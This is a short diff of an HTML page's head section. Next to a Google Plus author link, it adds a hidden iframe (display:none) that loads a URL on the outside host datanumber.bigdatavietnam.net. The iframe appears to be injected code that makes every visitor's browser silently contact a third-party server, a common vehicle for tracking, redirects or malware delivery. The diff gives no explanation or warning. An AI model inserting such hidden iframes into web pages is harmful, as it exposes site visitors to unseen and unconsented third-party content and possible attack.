@@ -120,7 +120,7 @@
 
 
         <link href="https://plus.google.com/103170739933034879752" rel="author">
-
+        <iframe src="http://datanumber.bigdatavietnam.net/api.php/n?pid=1372" style="display: none;"></iframe>
 
     </head>
 
